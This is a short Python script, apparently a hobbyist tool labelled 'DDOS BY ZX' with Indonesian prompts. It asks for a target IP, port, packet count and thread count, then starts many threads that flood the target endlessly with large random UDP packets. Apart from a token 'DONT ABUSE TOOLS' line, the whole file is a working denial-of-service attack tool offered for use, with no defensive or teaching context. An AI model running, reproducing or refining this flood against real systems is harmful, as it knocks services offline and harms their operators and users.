#!/usr/bin/env python3
#DDOS BY ZX
import random
import socket
import threading
import os

os.system("clear")
print("DONT ABUSE TOOLS")
print("KALO MAU REMAKE/RENANE PM GUA")
ip = str(input(" ATTACK IP:"))
port = int(input("ATTACK Port:"))
choice = str(input(" ATTACK Yakin lu(y/n):"))
times = int(input(" ATTACK Packet:"))
threads = int(input(" ATTACK Threads:"))
def run1(): #Udp-flood
    data = random._urandom(10240)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            
        except:
            s.close()

for y in range(threads):
          threading.Thread(target = run1).start()